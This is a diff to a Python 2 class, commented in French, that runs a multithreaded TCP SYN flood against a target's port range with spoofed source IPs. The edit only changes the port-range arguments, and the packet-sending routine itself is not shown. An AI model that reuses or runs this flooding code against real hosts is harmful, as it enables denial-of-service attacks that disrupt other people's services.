@@ -18,7 +18,7 @@ class DOS():
         self.target = target
         self.port = int(port)
 
-    def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True, infinite = False):
+    def tcp_syn_flood(self, start=30000, end=60000, fake_ip = True, infinite = False):
         """
             Execute un tcp flood sur une cible. Par défaut l'attaque flood les ports 30 000
             à 60 000 (ou ceux spécifiés) une fois chacun. Si le paramètre infinite est à True,
@@ -26,7 +26,7 @@ class DOS():
         """
 
         # Creating pool of flood threads
-        pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})
+        pool = self.createFloodPool(start, end, 100, self.__tcp_syn_flood, fake_ip, arguments = {})
 
         print "Starting flooding..."
         for t in pool: t.start()      # Starting threads
@@ -38,17 +38,17 @@ class DOS():
 
         print "Ending flooding."
 
-    def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
+    def createFloodPool(self, flood_port_start, flood_port_end, flood_port_step, funct, fake_ip, arguments = {}):
         """
             Créé un pool de threads éxécutant une fonction donnée par le paramètre 'funct'. Ces pools
-            attaquent les ports 'flood_port_start' à 'flood_port_start' + 'flood_port_len' et chaque
+            attaquent les ports 'flood_port_start' à 'flood_port_end' et chaque
             thread s'occupe de 'flood_port_step' ports.
             Si 'fake_ip' est à True, des IP factices seront insérées dans les packets envoyés.
         """
 
         pool = []
 
-        for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
+        for port in range(flood_port_start, flood_port_end, flood_port_step):
 
             # On calcul les paramètres (uniques et spécifiques) de chaque thread
             arg = copy.copy(arguments)
